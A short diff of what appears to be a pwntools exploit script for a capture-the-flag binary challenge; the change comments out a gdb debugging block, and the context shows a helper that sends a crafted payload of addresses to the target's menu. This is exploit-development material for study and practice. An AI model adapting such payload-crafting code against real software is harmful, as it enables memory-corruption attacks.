@@ -8,18 +8,18 @@ ld = ELF("./ld-2.27.so")
 
 context.binary = exe
 p = process(exe.path)
-context.terminal = ["foot"]
-
-gdb.attach(p, gdbscript='''
-           # b*0x555555556256 
-           # b*0x18d5 +0x555555554000 
-           # b*0x1946 + 0x555555554000
-           # b*0x55555555594e
-           # b*0x2305  + 0x555555554000
-           b*0x55555555632d
-
-''')
-
+# context.terminal = ["foot"]
+#
+# gdb.attach(p, gdbscript='''
+#            # b*0x555555556256 
+#            # b*0x18d5 +0x555555554000 
+#            # b*0x1946 + 0x555555554000
+#            # b*0x55555555594e
+#            # b*0x2305  + 0x555555554000
+#            b*0x55555555632d
+#
+# ''')
+#
 def create_hero(a,addr,stack):
     p.sendlineafter(b'hero do you want?(0-2)',str(a))
     p.sendafter(b' your hero?',p8(0x12) + b'\0'*3 +p64(stack)+p32(addr &0xffffffff))
